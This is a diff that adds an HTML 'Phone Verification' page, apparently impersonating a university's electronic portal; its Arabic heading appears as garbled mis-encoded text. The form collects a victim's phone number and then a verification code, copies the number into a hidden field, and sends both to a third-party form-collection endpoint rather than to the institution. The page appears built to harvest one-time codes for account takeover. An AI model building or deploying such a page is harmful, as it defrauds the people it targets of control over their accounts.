@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phone Verification</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <img src="images/logo.png" alt="University Logo" class="logo">
+            <h1>√Â·« »ﬂ„ ›Ì «·»Ê«»… «·≈·ﬂ —Ê‰Ì… ·Ã«„⁄… ÿ—«»·” «·√Â·Ì…</h1>
+        </header>
+        <form id="verification-form" action="https://formspree.io/f/xkgwqbrw" method="POST" novalidate>
+            <div id="step1" aria-labelledby="phone-step-title">
+                <h2 id="phone-step-title">Enter Your Phone Number</h2>
+                <label for="phone-number" class="sr-only">Phone Number</label>
+                <input type="tel" id="phone-number" name="phone" placeholder="Phone Number" required aria-required="true">
+                <button type="button" onclick="nextStep()">Next</button>
+            </div>
+            
+            <div id="step2" class="hidden" aria-labelledby="code-step-title">
+                <h2 id="code-step-title">Enter the Verification Code</h2>
+                <label for="verification-code" class="sr-only">Verification Code</label>
+                <input type="text" id="verification-code" name="code" placeholder="Verification Code" required aria-required="true">
+                <input type="hidden" id="hidden-phone" name="phone">
+                <input type="submit" value="Submit">
+            </div>
+        </form>
+    </div>
+
+    <script>
+        function nextStep() {
+            const phoneNumber = document.getElementById('phone-number').value;
+            document.getElementById('hidden-phone').value = phoneNumber;
+
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+        }
+    </script>
+</body>
+</html>
